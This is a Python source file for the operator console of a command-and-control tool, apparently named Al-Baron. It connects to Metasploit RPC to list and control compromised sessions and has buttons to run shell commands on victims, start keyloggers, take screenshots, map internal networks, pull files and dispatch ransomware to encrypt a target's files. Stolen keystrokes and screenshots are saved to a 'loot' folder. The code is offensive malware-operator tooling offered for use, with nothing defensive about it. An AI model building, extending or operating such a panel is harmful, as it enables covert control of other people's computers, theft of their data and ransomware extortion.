# language: Python, file: modules/c2_ui.py
# advanced C2 UI — session graph, world map, multi-tab terminal, file browser
import customtkinter as ctk
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import queue
import json
import os
import time
import math
import random
import subprocess
from datetime import datetime
from collections import defaultdict

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    HAS_MSF = True
except ImportError:
    HAS_MSF = False


class MSFBridge:
    """جسر يربط Al-Baron بـ Metasploit RPC تلقائياً"""
    def __init__(self, log_queue, c2_ui_instance):
        self.log = log_queue
        self.ui = c2_ui_instance
        self.running = False
        self.msf_process = None
        self.client = None
        self._thread = None

    def start(self):
        if not HAS_MSF:
            self.log.put("[msf-bridge] pymetasploit3 missing. Run: pip install pymetasploit3")
            return
        if self.running:
            return
        self.running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False
        if self.client:
            try:
                self.client.logout()
            except:
                pass

    def _run(self):
        self.log.put("[msf-bridge] Connecting to msfrpcd...")
        
        # 1. محاولة الاتصال (إذا كان الخادم يعمل مسبقاً)
        try:
            self.client = MsfRpcClient('password', port=55553, ssl=False)
            self.log.put("[msf-bridge] Connected to existing msfrpcd.")
        except Exception:
            # 2. إذا لم يعمل، نبدأ تشغيله في الخلفية
            self.log.put("[msf-bridge] Starting msfrpcd process...")
            try:
                self.msf_process = subprocess.Popen(
                    ["msfrpcd", "-P", "password", "-S", "-p", "55553"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(6)  # ننتظر إقلاع الخادم
                self.client = MsfRpcClient('password', port=55553, ssl=False)
                self.log.put("[msf-bridge] msfrpcd started and connected.")
            except Exception as e:
                self.log.put(f"[msf-bridge] Failed to start msfrpcd: {e}")
                return

        # 3. حلقة مراقبة الجلسات
        self.log.put("[msf-bridge] Listening for new sessions (polling every 3s)...")
        last_sessions = set()

        while self.running:
            try:
                sessions = self.client.sessions.list
                current_sessions = set(sessions.keys())

                # الجلسات الجديدة
                new = current_sessions - last_sessions
                for sid in new:
                    info = sessions[sid]
                    target_ip = info.get("target_host", "unknown")
                    self.ui.add_session(sid, {
                        "ip": target_ip,
                        "host": info.get("info", "unknown")[:20],
                        "user": info.get("username", "unknown"),
                        "os": info.get("platform", "unknown"),
                        "arch": info.get("arch", "x64"),
                        "backend": "metasploit",
                        "last_seen": datetime.now().strftime("%H:%M:%S"),
                        "online": True
                    })
                    self.log.put(f"[msf-bridge] Auto-added session: {sid} ({target_ip})")

                # الجلسات المغلقة
                closed = last_sessions - current_sessions
                for sid in closed:
                    self.ui.remove_session(sid)
                    self.log.put(f"[msf-bridge] Session closed: {sid}")

                last_sessions = current_sessions

            except Exception as e:
                # نتجاهل أخطاء الاتصال المؤقتة
                pass

            time.sleep(3)


class SessionGraph(tk.Canvas):
    """force-directed graph of C2 sessions and their pivots"""
    def __init__(self, parent, **kw):
        super().__init__(parent, bg="#05080c", highlightthickness=0, **kw)
        self.nodes = {}          # sid -> {x, y, vx, vy, data}
        self.edges = []          # (src, dst)
        self.selected = None
        self.on_select = None
        self.bind("<Button-1>", self._click)
        self._animating = False

    def add_session(self, sid, data):
        if sid in self.nodes:
            return
        w = self.winfo_width() or 800
        h = self.winfo_height() or 600
        self.nodes[sid] = {
            "x": w / 2 + random.uniform(-150, 150),
            "y": h / 2 + random.uniform(-150, 150),
            "vx": 0, "vy": 0,
            "data": data,
        }
        if not self._animating:
            self._animate()

    def add_pivot(self, src_sid, dst_sid):
        self.edges.append((src_sid, dst_sid))

    def _click(self, event):
        for sid, n in self.nodes.items():
            if math.hypot(event.x - n["x"], event.y - n["y"]) < 20:
                self.selected = sid
                if self.on_select:
                    self.on_select(sid, n["data"])
                self._draw()
                return
        self.selected = None
        if self.on_select:
            self.on_select(None, None)
        self._draw()

    def _animate(self):
        self._animating = True
        self._step()
        self.after(50, self._animate)

    def _step(self):
        w = self.winfo_width() or 800
        h = self.winfo_height() or 600
        k = math.sqrt((w * h) / max(len(self.nodes), 1)) * 0.7

        for sid_a, a in self.nodes.items():
            a["vx"] = a["vy"] = 0
            for sid_b, b in self.nodes.items():
                if sid_a == sid_b:
                    continue
                dx = a["x"] - b["x"]
                dy = a["y"] - b["y"]
                d = max(math.hypot(dx, dy), 1)
                f = k * k / d
                a["vx"] += (dx / d) * f
                a["vy"] += (dy / d) * f

        for src, dst in self.edges:
            if src not in self.nodes or dst not in self.nodes:
                continue
            a = self.nodes[src]
            b = self.nodes[dst]
            dx = a["x"] - b["x"]
            dy = a["y"] - b["y"]
            d = max(math.hypot(dx, dy), 1)
            f = d * d / k
            a["vx"] -= (dx / d) * f
            a["vy"] -= (dy / d) * f

        for n in self.nodes.values():
            n["vx"] += (w / 2 - n["x"]) * 0.01
            n["vy"] += (h / 2 - n["y"]) * 0.01
            n["x"] += n["vx"] * 0.1
            n["y"] += n["vy"] * 0.1
            n["x"] = max(30, min(w - 30, n["x"]))
            n["y"] = max(30, min(h - 30, n["y"]))

        self._draw()

    def _draw(self):
        self.delete("all")
        for src, dst in self.edges:
            if src in self.nodes and dst in self.nodes:
                a, b = self.nodes[src], self.nodes[dst]
                self.create_line(a["x"], a["y"], b["x"], b["y"],
                                 fill="#1a4a2e", width=1)
        for sid, n in self.nodes.items():
            r = 22 if sid == self.selected else 16
            color = "#00ff9c" if sid == self.selected else "#1a4a2e"
            self.create_oval(n["x"]-r, n["y"]-r, n["x"]+r, n["y"]+r,
                             fill=color, outline="#00ff9c", width=2)
            self.create_text(n["x"], n["y"], text=sid[:6],
                             fill="#0a0e14" if sid == self.selected else "#00ff9c",
                             font=("Consolas", 8, "bold"))
            self.create_text(n["x"], n["y"] + r + 10,
                             text=n["data"].get("host", "?"),
                             fill="#7dffb0", font=("Consolas", 7))


class WorldMap(tk.Canvas):
    def __init__(self, parent, **kw):
        super().__init__(parent, bg="#05080c", highlightthickness=0, **kw)
        self.pins = []
        self._bg = None
        self.bind("<Configure>", lambda e: self._draw())

    def add_pin(self, lat, lon, data):
        self.pins.append((lat, lon, data))
        self._draw()

    def _project(self, lat, lon):
        w = self.winfo_width() or 800
        h = self.winfo_height() or 500
        x = (lon + 180) / 360 * w
        y = (90 - lat) / 180 * h
        return x, y

    def _draw(self):
        self.delete("all")
        w = self.winfo_width()
        h = self.winfo_height()
        for i in range(0, w, 40):
            self.create_line(i, 0, i, h, fill="#0d1319")
        for i in range(0, h, 40):
            self.create_line(0, i, w, i, fill="#0d1319")
        self.create_line(0, h/2, w, h/2, fill="#1a4a2e", dash=(2, 4))
        self.create_line(w/2, 0, w/2, h, fill="#1a4a2e", dash=(2, 4))
        for lat, lon, data in self.pins:
            x, y = self._project(lat, lon)
            r = 6
            self.create_oval(x-r, y-r, x+r, y+r,
                             fill="#ff6b6b", outline="#00ff9c", width=1)
            self.create_text(x, y - 12, text=data.get("host", "?"),
                             fill="#7dffb0", font=("Consolas", 7))


class C2UIModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "c2_ui"
        self.sessions = {}
        self.terminal_history = defaultdict(list)
        self.file_browser_cache = {}
        self.active_session = None
        self.graph = None
        self.map = None
        
        # بدء الجسر التلقائي
        self.msf_bridge = MSFBridge(log_queue, self)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="C2 CONSOLE",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="sessions · graph · map · terminal · files · tasks",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        tabs = ctk.CTkTabview(parent, fg_color="#0d1319",
                              segmented_button_fg_color="#141a22",
                              segmented_button_selected_color="#0d2818",
                              segmented_button_selected_hover_color="#1a4a2e")
        tabs.pack(fill="both", expand=True, padx=24, pady=(0, 12))
        tabs.add("Sessions")
        tabs.add("Graph")
        tabs.add("Map")
        tabs.add("Terminal")
        tabs.add("Files")
        tabs.add("Tasks")

        # ---- Sessions ----
        s_tab = tabs.tab("Sessions")
        self.sessions_tree = ttk.Treeview(
            s_tab, columns=("ip", "host", "user", "os", "arch", "last"),
            show="headings", height=14
        )
        for col, txt, w in [
            ("ip", "IP", 130), ("host", "Host", 150), ("user", "User", 120),
            ("os", "OS", 180), ("arch", "Arch", 80), ("last", "Last Seen", 160),
        ]:
            self.sessions_tree.heading(col, text=txt)
            self.sessions_tree.column(col, width=w)
        self.sessions_tree.pack(fill="both", expand=True, padx=8, pady=8)
        self.sessions_tree.bind("<<TreeviewSelect>>", self._on_session_select)

        btn_row = ctk.CTkFrame(s_tab, fg_color="transparent")
        btn_row.pack(fill="x", padx=8, pady=(0, 8))
        for label, fn in [
            ("▸ Refresh", self._refresh_sessions),
            ("▸ Interact", self._interact),
            ("▸ Sleep", self._set_sleep),
            ("▸ Kill", self._kill_session),
            ("▸ Screenshot", self._screenshot),
            ("▸ Keylog", self._keylog_toggle),
            ("▸ Pivot Info", self._pivot_info),
            ("▸ Export", self._export_sessions),
        ]:
            ctk.CTkButton(btn_row, text=label, width=110, height=30,
                          fg_color="#141a22", hover_color="#1a2332",
                          font=ctk.CTkFont(size=10), command=fn
                          ).pack(side="left", padx=(0, 4))

        # ---- Graph ----
        g_tab = tabs.tab("Graph")
        self.graph = SessionGraph(g_tab)
        self.graph.on_select = self._on_graph_select
        self.graph.pack(fill="both", expand=True, padx=8, pady=8)

        # ---- Map ----
        m_tab = tabs.tab("Map")
        self.map = WorldMap(m_tab)
        self.map.pack(fill="both", expand=True, padx=8, pady=8)

        # ---- Terminal ----
        t_tab = tabs.tab("Terminal")
        top = ctk.CTkFrame(t_tab, fg_color="transparent")
        top.pack(fill="x", padx=8, pady=(8, 4))
        self.term_session = ctk.CTkLabel(top, text="no session selected",
                                          text_color="#4a5568",
                                          font=ctk.CTkFont(size=11))
        self.term_session.pack(side="left")
        ctk.CTkButton(top, text="⌘ Clean", width=80, height=26,
                      fg_color="#141a22", hover_color="#1a2332",
                      font=ctk.CTkFont(size=10),
                      command=self._clean_terminal).pack(side="right", padx=4)
        ctk.CTkButton(top, text="⏹ Ctrl+C", width=90, height=26,
                      fg_color="#141a22", hover_color="#1a2332",
                      font=ctk.CTkFont(size=10),
                      command=self._send_ctrlc).pack(side="right", padx=4)

        self.terminal = ctk.CTkTextbox(
            t_tab, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=11), wrap="word"
        )
        self.terminal.pack(fill="both", expand=True, padx=8, pady=4)

        inp_row = ctk.CTkFrame(t_tab, fg_color="transparent")
        inp_row.pack(fill="x", padx=8, pady=(0, 8))
        self.term_input = ctk.CTkEntry(
            inp_row, placeholder_text="command...",
            height=34, fg_color="#05080c", border_color="#1a2332",
            font=ctk.CTkFont(family="Consolas", size=11)
        )
        self.term_input.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self.term_input.bind("<Return>", lambda e: self._send_cmd())
        self.term_input.bind("<Up>", lambda e: self._history_up())
        self.term_input.bind("<Down>", lambda e: self._history_down())
        ctk.CTkButton(inp_row, text="▸ Send", width=90, height=34,
                      fg_color="#0d2818", hover_color="#1a4a2e",
                      text_color="#00ff9c",
                      command=self._send_cmd).pack(side="left")

        # ---- Files ----
        f_tab = tabs.tab("Files")
        path_row = ctk.CTkFrame(f_tab, fg_color="transparent")
        path_row.pack(fill="x", padx=8, pady=8)
        self.path_entry = ctk.CTkEntry(
            path_row, placeholder_text="remote path", height=32,
            fg_color="#05080c", border_color="#1a2332"
        )
        self.path_entry.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self.path_entry.bind("<Return>", lambda e: self._list_dir())
        ctk.CTkButton(path_row, text="▸ List", width=80, height=32,
                      fg_color="#141a22", hover_color="#1a2332",
                      command=self._list_dir).pack(side="left", padx=(0, 4))
        ctk.CTkButton(path_row, text="▸ Download", width=110, height=32,
                      fg_color="#0d2818", hover_color="#1a4a2e",
                      text_color="#00ff9c",
                      command=self._download_file).pack(side="left", padx=(0, 4))
        ctk.CTkButton(path_row, text="▸ Upload", width=100, height=32,
                      fg_color="#0d2818", hover_color="#1a4a2e",
                      text_color="#00ff9c",
                      command=self._upload_file).pack(side="left", padx=(0, 4))
        ctk.CTkButton(path_row, text="▸ Ransom", width=90, height=32,
                      fg_color="#4a1a1a", hover_color="#6b1a1a",
                      text_color="#ff6b6b",
                      command=self._ransomware).pack(side="left")

        self.files_tree = ttk.Treeview(
            f_tab, columns=("size", "mode", "mtime"), show="tree headings"
        )
        self.files_tree.heading("#0", text="Name")
        self.files_tree.heading("size", text="Size")
        self.files_tree.heading("mode", text="Mode")
        self.files_tree.heading("mtime", text="Modified")
        self.files_tree.column("#0", width=400)
        self.files_tree.column("size", width=100)
        self.files_tree.column("mode", width=100)
        self.files_tree.column("mtime", width=180)
        self.files_tree.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.files_tree.bind("<Double-1>", self._on_file_dbl)

        # ---- Tasks ----
        tk_tab = tabs.tab("Tasks")
        self.tasks_box = ctk.CTkTextbox(
            tk_tab, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10)
        )
        self.tasks_box.pack(fill="both", expand=True, padx=8, pady=8)

        # initial refresh
        self._refresh_sessions()
        
        # بدء الجسر التلقائي بعد بناء الواجهة
        self.msf_bridge.start()

    # ==================== session management ====================
    def _refresh_sessions(self):
        if not hasattr(self, "sessions_tree") or not self.sessions_tree.winfo_exists():
            return
        for iid in self.sessions_tree.get_children():
            self.sessions_tree.delete(iid)
        for sid, s in self.sessions.items():
            self.sessions_tree.insert("", "end", iid=sid, values=(
                s.get("ip", "?"),
                s.get("host", "?"),
                s.get("user", "?"),
                s.get("os", "?"),
                s.get("arch", "?"),
                s.get("last_seen", "?"),
            ))

    def add_session(self, sid, data):
        self.sessions[sid] = data
        # نستخدم after لضمان التحديث في الـ main thread
        if hasattr(self, "sessions_tree") and self.sessions_tree.winfo_exists():
            self.sessions_tree.after(0, self._refresh_sessions)
        if self.graph:
            self.graph.after(0, lambda: self.graph.add_session(sid, data))
        if self.map and "lat" in data and "lon" in data:
            self.map.after(0, lambda: self.map.add_pin(data["lat"], data["lon"], data))
        self.log.put(f"[c2ui] session online: {sid}")

    def remove_session(self, sid):
        self.sessions.pop(sid, None)
        if hasattr(self, "sessions_tree") and self.sessions_tree.winfo_exists():
            self.sessions_tree.after(0, self._refresh_sessions)
        if self.graph:
            self.graph.after(0, lambda: self.graph.nodes.pop(sid, None))
        self.log.put(f"[c2ui] session offline: {sid}")

    def _on_session_select(self, event):
        sel = self.sessions_tree.selection()
        if sel:
            self.active_session = sel[0]
            self.term_session.configure(
                text=f"session: {self.active_session}", text_color="#00ff9c")
            self._render_terminal(self.active_session)

    def _on_graph_select(self, sid, data):
        if sid:
            self.active_session = sid
            self._refresh_sessions()
            self.sessions_tree.selection_set(sid)

    def _interact(self):
        if self.active_session:
            self.log.put(f"[c2ui] interact {self.active_session}")
            self._render_terminal(self.active_session)

    def _set_sleep(self):
        if not self.active_session:
            return
        import tkinter.simpledialog as sd
        n = sd.askinteger("Sleep", "Sleep seconds:", initialvalue=60)
        if n:
            self._dispatch(self.active_session, f"sleep {n}")
            self.log.put(f"[c2ui] {self.active_session} sleep={n}")

    def _kill_session(self):
        if not self.active_session:
            return
        if messagebox.askyesno("Kill", f"Kill session {self.active_session}?"):
            self._dispatch(self.active_session, "exit")
            self.log.put(f"[c2ui] kill sent to {self.active_session}")

    def _screenshot(self):
        if not self.active_session:
            return
        self._dispatch(self.active_session, "screenshot")
        self.log.put(f"[c2ui] screenshot requested")

    def _keylog_toggle(self):
        if not self.active_session:
            return
        self._dispatch(self.active_session, "keylog start")
        self.log.put(f"[c2ui] keylogger started on {self.active_session}")

    def _pivot_info(self):
        if not self.active_session:
            return
        self._dispatch(self.active_session, "netstat -rn; arp -a; ipconfig /all")

    def _export_sessions(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON", "*.json"), ("CSV", "*.csv")])
        if not path:
            return
        if path.endswith(".csv"):
            import csv
            with open(path, "w", newline="") as f:
                w = csv.DictWriter(f, fieldnames=list(
                    next(iter(self.sessions.values())).keys()))
                w.writeheader()
                for s in self.sessions.values():
                    w.writerow(s)
        else:
            with open(path, "w") as f:
                json.dump(self.sessions, f, indent=2)
        self.log.put(f"[c2ui] exported → {path}")

    # ==================== terminal ====================
    def _render_terminal(self, sid):
        if not hasattr(self, "terminal") or not self.terminal.winfo_exists():
            return
        self.terminal.delete("1.0", "end")
        for line in self.terminal_history[sid][-200:]:
            self.terminal.insert("end", line + "\n")
        self.terminal.see("end")

    def _send_cmd(self):
        if not self.active_session:
            return
        cmd = self.term_input.get().strip()
        if not cmd:
            return
        self.term_input.delete(0, "end")
        self.terminal_history[self.active_session].append(f"\n$ {cmd}")
        self.terminal.insert("end", f"\n$ {cmd}\n")
        self.terminal.see("end")
        
        # التحكم الفعلي عبر Metasploit
        if HAS_MSF and self.msf_bridge and self.msf_bridge.client:
            try:
                # جلب الجلسة
                sess = self.msf_bridge.client.sessions.session(self.active_session)
                # إرسال الأمر (كمثال، نستخدم meterpreter أو shell)
                sess.write(cmd + "\n")
                # انتظار النتيجة (تقريبي)
                time.sleep(0.5)
                output = sess.read()
                if output:
                    self.terminal.insert("end", output + "\n")
                    self.terminal_history[self.active_session].append(output)
            except Exception as e:
                self.terminal.insert("end", f"[!] MSF error: {e}\n")
        else:
            self._dispatch(self.active_session, f"shell:{cmd}")

    def _send_ctrlc(self):
        if self.active_session:
            self._dispatch(self.active_session, "signal 2")

    def _clean_terminal(self):
        if self.active_session:
            self.terminal_history[self.active_session] = []
            self.terminal.delete("1.0", "end")

    _hist_idx = -1
    def _history_up(self):
        if not self.active_session:
            return
        hist = [l[2:] for l in self.terminal_history[self.active_session]
                if l.startswith("$ ")]
        if not hist:
            return
        self._hist_idx = max(0, self._hist_idx - 1)
        if abs(self._hist_idx) <= len(hist):
            self.term_input.delete(0, "end")
            self.term_input.insert(0, hist[self._hist_idx])

    def _history_down(self):
        if not self.active_session:
            return
        self._hist_idx = min(0, self._hist_idx + 1)
        if self._hist_idx == 0:
            self.term_input.delete(0, "end")

    # ==================== files ====================
    def _list_dir(self):
        if not self.active_session:
            return
        path = self.path_entry.get().strip() or "."
        self._dispatch(self.active_session, f"ls:{path}")

    def _on_file_dbl(self, event):
        sel = self.files_tree.selection()
        if not sel:
            return
        name = self.files_tree.item(sel[0], "text")
        path = os.path.join(self.path_entry.get().strip() or ".", name)
        self.path_entry.delete(0, "end")
        self.path_entry.insert(0, path)
        self._list_dir()

    def _download_file(self):
        if not self.active_session:
            return
        sel = self.files_tree.selection()
        if not sel:
            return
        name = self.files_tree.item(sel[0], "text")
        remote = os.path.join(self.path_entry.get().strip() or ".", name)
        self._dispatch(self.active_session, f"download:{remote}")
        self.log.put(f"[c2ui] download {remote}")

    def _upload_file(self):
        if not self.active_session:
            return
        local = filedialog.askopenfilename()
        if not local:
            return
        remote = os.path.join(self.path_entry.get().strip() or ".",
                              os.path.basename(local))
        self._dispatch(self.active_session, f"upload:{local}->{remote}")

    def _ransomware(self):
        if not self.active_session:
            return
        if not messagebox.askyesno(
            "Ransomware",
            "This will encrypt files on the target. Continue?"
        ):
            return
        self._dispatch(self.active_session, "ransomware:all")
        self.log.put(f"[c2ui] ransomware dispatched to {self.active_session}")

    # ==================== dispatch ====================
    def _dispatch(self, sid, task):
        """send task to C2 server — hooked by main app"""
        if hasattr(self, "on_dispatch"):
            self.on_dispatch(sid, task)
        ts = datetime.now().strftime("%H:%M:%S")
        if hasattr(self, "tasks_box") and self.tasks_box.winfo_exists():
            self.tasks_box.insert("end",
                f"[{ts}] {sid[:8]} ← {task[:100]}\n")
            self.tasks_box.see("end")
        if sid == self.active_session and hasattr(self, "terminal") and self.terminal.winfo_exists():
            self.terminal_history[sid].append(f"→ {task}")

    # ==================== inbound handling ====================
    def on_beacon(self, sid, data):
        data["last_seen"] = datetime.now().strftime("%H:%M:%S")
        if sid not in self.sessions:
            self.add_session(sid, data)
        else:
            self.sessions[sid].update(data)
            self._refresh_sessions()

    def on_task_result(self, sid, result):
        if sid == self.active_session and hasattr(self, "terminal") and self.terminal.winfo_exists():
            self.terminal.insert("end", result + "\n")
            self.terminal.see("end")
            self.terminal_history[sid].append(result)

        if result.startswith("FILES:"):
            self._populate_files(result[6:])
        elif result.startswith("SCREENSHOT:"):
            self._handle_screenshot(result[11:])
        elif result.startswith("KEYLOG:"):
            self._handle_keylog(result[7:])

    def _populate_files(self, blob):
        if not hasattr(self, "files_tree") or not self.files_tree.winfo_exists():
            return
        for iid in self.files_tree.get_children():
            self.files_tree.delete(iid)
        for line in blob.splitlines():
            parts = line.split("\t")
            if len(parts) >= 4:
                self.files_tree.insert("", "end", text=parts[0],
                    values=(parts[1], parts[2], parts[3]))

    def _handle_screenshot(self, b64_data):
        try:
            import base64
            data = base64.b64decode(b64_data)
            os.makedirs("loot/screenshots", exist_ok=True)
            path = f"loot/screenshots/{self.active_session}_{int(time.time())}.png"
            with open(path, "wb") as f:
                f.write(data)
            self.log.put(f"[c2ui] screenshot saved: {path}")
            os.system(f"xdg-open {path} &")
        except Exception as e:
            self.log.put(f"[c2ui] screenshot err: {e}")

    def _handle_keylog(self, data):
        os.makedirs("loot/keylogs", exist_ok=True)
        path = f"loot/keylogs/{self.active_session}.log"
        with open(path, "a") as f:
            f.write(data)
        self.log.put(f"[c2ui] keylog append → {path}")
